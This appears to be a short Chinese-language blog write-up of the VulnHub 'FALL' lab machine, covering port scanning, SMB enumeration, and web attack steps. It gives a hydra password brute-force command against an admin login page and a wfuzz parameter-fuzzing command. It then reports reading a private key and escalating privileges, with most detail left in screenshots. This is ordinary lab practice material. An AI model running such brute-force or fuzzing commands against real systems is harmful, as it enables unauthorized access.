+++
ShowToc = true
TocOpen = true
title = '0x065 Digitalword.local(FALL)'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# 端口扫描

![](/vulnhub_img/WEBRESOURCE4892771c0189d30166b9715c6a61df8aimage.png)

![](/vulnhub_img/WEBRESOURCE76c1ce6e0d52a6c6ee012f787502b3a8image.png)

![](/vulnhub_img/WEBRESOURCE67a1fbba64dc9e10d192e3c4b86bcd31image.png)

# 渗透测试

SMB没啥东西：

![](/vulnhub_img/WEBRESOURCE3536960cdc270398c9c8008fd2b961c5image.png)

80端口

![](/vulnhub_img/WEBRESOURCE7887a9b4f2a956571552406fd941bf19image.png)

查了很多的payload，发现都是认证后的漏洞，得想办法找一下密码了：

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.5.102 http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=incorrect" -t 64

先爆破着：

![](/vulnhub_img/WEBRESOURCEca0bfc5272db95f42c22aa37473d7c55image.png)

然后接着看目录扫描结果：

![](/vulnhub_img/WEBRESOURCEd9b253b9caf07a042a97aa9b8a901b57image.png)

wfuzz -u "[http://192.168.5.102/test.php?FUZZ=1](http://192.168.5.102/test.php?FUZZ=1)" -w /usr/share/wordlists/wfuzz/general/common.txt --hw 7

![](/vulnhub_img/WEBRESOURCE82f1f7774b21a0f0748e3b9bea8ac9beimage.png)

发现信息

![](/vulnhub_img/WEBRESOURCEfc4d7de55dc8a3e489b2ac92867943fbimage.png)

偷看私钥成功：

![](/vulnhub_img/WEBRESOURCEe9901d1365981108414823df00bf7e7bimage.png)

# 提权

![](/vulnhub_img/WEBRESOURCE33dcc17b8d7c710554b90ad54888e13dimage.png)

密码：

![](/vulnhub_img/WEBRESOURCEd2fa0004111621d6c40b906905f3d988image.png)